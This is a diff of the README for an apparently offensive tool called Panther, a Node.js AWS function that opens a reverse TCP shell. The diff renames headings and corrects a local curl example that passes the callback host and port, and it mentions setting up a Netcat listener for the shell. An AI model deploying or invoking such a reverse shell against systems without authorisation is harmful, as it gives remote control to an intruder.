@@ -7,7 +7,7 @@ Panther is a Node.js function that can be deployed to the AWS to establish a TCP
 * [AWS Command Line Interface](https://aws.amazon.com/cli/)
 * [Node.js / NPM](https://nodejs.org/en/download/)
 
-## Getting Started
+## Deploying The Function
 
 ```bash
 cd /PATH/TO/panther
@@ -30,7 +30,7 @@ api keys:
   panther: YOUR_API_KEY
 ```
 
-## Usage
+## Testing in AWS
 
 Set up a TCP listener for your reverse shell, such as with [Netcat](http://netcat.sourceforge.net/):
 
@@ -67,7 +67,7 @@ npm start
 ## Testing Locally
 
 ```bash
-curl 'http://localhost:3000/api/Panther?host=0.tcp.ngrok.io&port=17105?host=YOUR_ACCESSIBLE_HOST&port=YOUR_PORT_NUMBER' -H 'x-api-key: offlineKey'
+curl 'http://localhost:3000/api/Panther?host=YOUR_ACCESSIBLE_HOST&port=YOUR_PORT_NUMBER' -H 'x-api-key: offlineKey'
 ```
 
 ## Linting
